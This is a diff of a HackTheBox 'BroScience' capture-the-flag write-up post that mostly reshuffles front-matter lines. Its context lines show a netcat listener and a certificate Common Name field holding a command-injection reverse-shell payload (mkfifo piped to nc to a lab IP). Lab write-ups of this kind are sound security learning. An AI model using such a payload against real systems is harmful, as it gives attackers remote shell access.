@@ -1,13 +1,13 @@
 ---
 layout: post
 title: HTB BroScience
-subtitle: BroScience is a medium difficulty Linux machine realeased on HackTheBox.
 cover-img: /assets/covers/BroScience.png
-share-img: /assets/covers/BroScience.png
 tags: [HTB, HackTheBox, Linux, PHP, deserialization, bash, LFI]
 comments: true
 ---
 
+BroScience is a medium difficulty Linux machine realeased on HackTheBox.
+<!--more-->
 ## Recon
 Let's start off with nmap scan as per usual:
 ```bash
@@ -429,6 +429,7 @@ listening on [any] 9999 ...
 Now move over to the vulnerable machine and create the malicious certificate. Few things to remember:
 - The certificate needs to be located at `/home/bill/Certs/broscience.crt`.
 - The certificate needs to expire in less than a day when the script runs.
+
 When creating the certificate, i ran into an issue:
 ```
 Common Name (e.g. server FQDN or YOUR name) []:whatever;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.169 9999 >/tmp/f;
